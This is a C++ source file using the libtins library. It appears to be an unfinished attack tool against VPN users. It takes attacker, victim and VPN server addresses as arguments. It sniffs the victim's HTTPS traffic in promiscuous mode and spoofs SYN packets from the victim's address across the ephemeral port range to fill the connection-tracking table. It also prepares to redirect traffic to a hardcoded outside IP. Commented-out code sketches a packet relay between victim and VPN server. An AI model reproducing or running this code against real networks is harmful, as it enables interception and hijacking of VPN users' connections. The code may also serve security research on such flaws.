#include <tins/tins.h>
#include <cassert>
#include <iostream>

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h> /* superset of previous */

#include <string>
#include <unistd.h>
#include <thread>
#include <random>
#include <chrono>


using std::thread;
using std::cout;
using std::string;
using std::vector;
using namespace Tins;

string bbaddr = "149.28.240.117"; // 149.28.240.117

string webdnsserver_ip;
IP dns_pkt;

string public_iface;
string attacker_pub_ip;

string victim_ip;
unsigned short victim_port;

// The port for the VPN Server UDP-port shadow (reflection)
string vpn_ip;
unsigned short vpn_port;

// The port for the VPN-stripped TCP-port shadow (reflection)
unsigned short https_port;

volatile bool udp_continue_ephem = true;
volatile bool tcp_continue_ephem = true;


bool _sniff_website_request_handler(PDU &some_pdu);
int udp_bind_port(unsigned short tobind);
int tcp_bind_port(unsigned short tobind);

int tcp_bind_port(unsigned short tobind) {
	int sockfd;
	struct sockaddr_in servaddr;


	if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
		perror("socket creation failed");
		exit(EXIT_FAILURE);
	}
	memset(&servaddr, 0, sizeof(servaddr));
	
	    // Filling server information
	servaddr.sin_family    = AF_INET; // IPv4
	servaddr.sin_addr.s_addr = INADDR_ANY;
	servaddr.sin_port = htons(tobind);

	    // Bind the socket with the server address
	if ( bind(sockfd, (const struct sockaddr *)&servaddr,
	    sizeof(servaddr)) < 0 )
	{
		perror("bind failed");
		exit(-1);
	}
	return sockfd;
}


/*
bool relay_packet(PDU &some_pdu) {
	PacketSender sender;
	NetworkInterface iface(public_iface);
	
	unsigned short vport;
	const IP &ip = some_pdu.rfind_pdu<IP>();
	const UDP &udp = some_pdu.rfind_pdu<UDP>();
	const RawPDU& raw = udp.rfind_pdu<RawPDU>();

	if (ip.src_addr() == victim_ip && ip.protocol() == IPPROTO_UDP) {
		std::cout << "relay_packet: Received victim packet to vpn server: src="
			<< ip.src_addr() << ":" << udp.sport() 
			<< ", dst=" << ip.dst_addr() << ":"
			<< udp.dport() << ":" << ip.tot_len() << std::endl;
		if (!dns_loop && ip.tot_len() == 124) { // 124 for wireguard, 104 for openvpn
			dns_loop = true;
			std::cout << "relay_packet: Real DNS request: Received victim DNS request: src="
				<< ip.tot_len() << std::endl;
			/ *
			dns_pkt = IP(vpn_ip) /
				UDP(vpn_port, victim_port) / raw;
			* /
			thread dns_reroute_thread(
					dns_reroute);
			dns_reroute_thread.detach();
		}
		IP pkt = IP(vpn_ip) /
			UDP(vpn_port, victim_port) / raw;
		sender.send(pkt, iface);
	}
	else if (ip.src_addr() == vpn_ip &&
			ip.dst_addr() == attacker_pub_ip &&
			udp.dport() == victim_port) {
		std::cout << "Received vpn packet to victim: src="
			<< ip.src_addr() << ":" << udp.sport() 
			<< ", dst=" << ip.dst_addr() << ":" 
			<< udp.dport() << std::endl;
		IP pkt = IP(victim_ip) /
			UDP(victim_port, vpn_port) / raw;
		sender.send(pkt, iface);
	} else {
		if (udp.sport() == 53) {
			std::cout << "Received something else: src="
				<< ip.src_addr() << ":" << udp.sport()
				<< ", dst=" << ip.dst_addr() << ":"
				<< udp.dport() << std::endl;
			print_raw_pdu(raw);
		}
	} 
	return true;
}

void relay_packet_handler() {
	SnifferConfiguration config;
	config.set_promisc_mode(true);
	Sniffer sniffer("any", config);
	sniffer.sniff_loop(relay_packet);
}
*/


void sniff_website_request_handler() {
	SnifferConfiguration config;
	config.set_promisc_mode(true);
	Sniffer sniffer("any", config);
	sniffer.sniff_loop(_sniff_website_request_handler);
}

bool _sniff_website_request_handler(PDU &some_pdu) {
	PacketSender sender;
	NetworkInterface iface(public_iface);
	const IP &ip = some_pdu.rfind_pdu<IP>();
	const TCP &tcp_req = some_pdu.rfind_pdu<TCP>();
	unsigned short vport;
//define IPPROTO_TCP 6 
	if (ip.src_addr() == victim_ip && ip.protocol() == IPPROTO_TCP &&
			tcp_req.dport()==https_port) {

		// Attacker receives packet from victim.
		vport = some_pdu.rfind_pdu<TCP>().sport();
		std::cout << "Vport=" << vport << std::endl;
		IP pkt = IP(bbaddr) / TCP(80, vport);
		TCP &tcp = pkt.rfind_pdu<TCP>();
		tcp.seq(tcp_req.seq());
		tcp.ack_seq(tcp_req.ack_seq());
		// tcp.set_flag(tcp_req.flags());

		tcp_continue_ephem = false;
		// tcp_bind_port(vport);
		// sender.send(pkt, iface);
		std::cout << "HTTP Filler - client web port: " << vport << std::endl; 
		return false;
		// This might be a problem. We might need to pre-emptivly drop
		// all the victim's TCP packets (like SYNs) to us so that our
		// kernel doesn't just respond with RST packets and screw up
		// the pivot in the OpenVPN server or something stupid, Or we
		// just have a webserver running on ourselves with the
		// compromised CERT... :} 
		// sender.send(pkt, iface);
	} else if (ip.src_addr() == bbaddr) {
		// 1. 3-way handshake: Look for the returning SYN/ACK
		// 2+. Data exchange: ACK, PSH/ACK??
	
	}
	return true;
}

#define PORT_RANGE_START 32768
#define PORT_RANGE_END 61000
void do_fill_table() {
        PacketSender sender;
        NetworkInterface iface("tun0"); // public_iface);//  
        while (tcp_continue_ephem) {
		for (short i=PORT_RANGE_START;i<PORT_RANGE_END; i++) {
                        // TCP packets placed in the ASSURED state
                        IP pkt = IP(victim_ip, "10.8.0.6") / TCP(i, https_port); 
			IP& ip = pkt.rfind_pdu<IP>();
			ip.ttl(2);
                        TCP &tcp = pkt.rfind_pdu<TCP>(); 
                        tcp.seq(1); 
                        tcp.ack_seq(0); 
                        tcp.set_flag(TCP::SYN, 1); 
			sender.send(pkt, iface);
                }
		usleep(10000000);
        }
}


/*
constexpr int SOCKET_READ_BUFFER_SIZE = 1024;
constexpr int SERVER_PORT = 8080;
constexpr int MAX_PENDING_CONNECTIONS = 5;

void *tcp_relay() {
	/**
	 *  
	 * 1. Listen on port 80.
	 * 2. Recieve traffic from the target to us on this socket
	 * 3. Connect to target, send payload from target to client and from client to target.
	 * l * /

}

void create_receive_socket() {
	int socket_receive = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in server_addr;
	memset(&server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	server_addr.sin_port = htons(SERVER_PORT);

	bind(socket_receive, (struct sockaddr *) &server_addr, sizeof(server_addr));
	listen(socket_receive, MAX_PENDING_CONNECTIONS);

	int client_socket = accept(socket_receive, NULL, NULL);

	char read_buffer[SOCKET_READ_BUFFER_SIZE];
	memset(read_buffer, 0, SOCKET_READ_BUFFER_SIZE);

	int received_bytes = recv(client_socket, read_buffer, SOCKET_READ_BUFFER_SIZE, 0);

	if (received_bytes > 0) {
		send(socket_send, read_buffer, received_bytes, 0);
	}

	close(socket_receive);
	close(socket_send);
	close(client_socket);

return 0;

}

void create_send_socket() {
    int socket_send = socket(AF_INET, SOCK_STREAM, 0);

}
*/


int main(int argc, char** argv) {
      
	if (argc != 8) {
		cout << "sike wrong number of args ---> (public_iface, attacker_pub_ip, victim_ip, vpn_ip, vpn_port, https_port, webdnsserver_ip)\n";
		return 0;
	}
	public_iface = argv[1];
	attacker_pub_ip = argv[2];

	victim_ip = argv[3]; // dns server IP

	vpn_ip = argv[4]; // dns server IP
	vpn_port = atoi(argv[5]);

	https_port = atoi(argv[6]);
	webdnsserver_ip = argv[7];

	// Need to bind to this port because the victim will send packets
	// to the tun interface's ip address and the VPN listening port 
	// tcp_bind_port(https_port);

        // Get the TCP boomerang ready	
	thread fill_table_thread(do_fill_table);
	fill_table_thread.detach();

	thread sniff_http_request(sniff_website_request_handler);
	sniff_http_request.join();

        // Get the UDP boomerang ready	
	//
	/*
        thread ephemeral_scan_thread(udp_fill_ephemeral_port_range);
	ephemeral_scan_thread.detach();
	thread sniff_vpn_request(sniff_vpn_request_handler);
	sniff_vpn_request.join();

	std::cout << "Done, victim sport is " << victim_port <<
		std::endl;
	std::cout << "Starting VPN Relay" << victim_port <<
		std::endl;


	thread fill_table_thread(do_fill_table);
	fill_table_thread.detach();

	thread sniff_tcp_thread(sniff_tcp_handler);
	sniff_tcp_thread.detach();

	thread relay_thread(relay_packet_handler);
	relay_thread.join();
	*/
	return 0;
}
